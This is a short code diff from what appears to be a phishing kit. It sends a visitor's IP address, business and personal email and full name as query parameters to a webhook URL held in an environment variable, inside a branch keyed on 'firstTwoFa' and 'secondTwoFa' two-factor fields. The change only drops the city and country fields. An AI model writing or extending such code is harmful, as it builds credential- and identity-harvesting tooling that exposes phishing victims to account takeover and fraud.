@@ -56,8 +56,6 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
     const url = new URL(process.env.WEBHOOK_URL);
 
     url.searchParams.append('Ip', data.ip ? data.ip : '');
-    url.searchParams.append('City', data.city ? data.city : '');
-    url.searchParams.append('Country', data.country ? data.country : '');
     url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
     url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
     url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
